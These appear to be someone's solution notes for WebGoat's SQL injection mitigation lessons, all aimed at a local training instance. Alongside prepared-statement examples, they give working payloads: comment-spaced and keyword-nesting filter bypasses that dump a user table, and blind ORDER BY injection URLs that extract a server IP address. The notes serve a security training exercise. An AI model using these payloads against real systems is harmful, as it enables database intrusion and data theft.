# Mitigation

# task5

```
1. getConnection
2. PreparedStatement ps
3. prepareStatement
4. ?
5. ?
6. ps.setString(1,"user")
7. ps.setString(2,"mail")

```

# task6

ps.execute(); could be change to ps.executeUpdate()

```
try {
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
     ps.setString(1, "Admin");
     ps.execute();
} catch (Exception e) {
     System.out.println("Oops. Something went wrong!");
}

```

# task 9

solution

```
a';/**/select/**/*/**/from/**/user_system_data;--
```

colution with union

```
a'/**/union/**/select/**/user_system_data.*,'1','1',1/**/from/**/user_system_data;--
```

# task 10

Removal od nesting strings

```
query : sth';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--

```

# task 12

if result from query is sorted the assumption is true

```
possitive check: http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,1)+FROM+servers+WHERE+hostname=%27webgoat-prd%27)+=+%271%27+THEN+id+ELSE+status+END)
possitive check: http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,2)+FROM+servers+WHERE+hostname=%27webgoat-prd%27)+=+%2710%27+THEN+id+ELSE+status+END)
possitive check: http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,3)+FROM+servers+WHERE+hostname=%27webgoat-prd%27)+=+%27104%27+THEN+id+ELSE+status+END)

```

```
negative check: possitive check: http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=(CASE+WHEN+(SELECT+substring(ip,1,3)+FROM+servers+WHERE+hostname=%27webgoat-prd%27)+=+%27134%27+THEN+id+ELSE+status+END)
```

our query sent to order injection

```
CASE WHEN (
 SELECT
   substring(ip, 1, 2)
 FROM
   servers
 WHERE
   hostname = 'webgoat-prd'
) = '10' THEN id ELSE status END
```
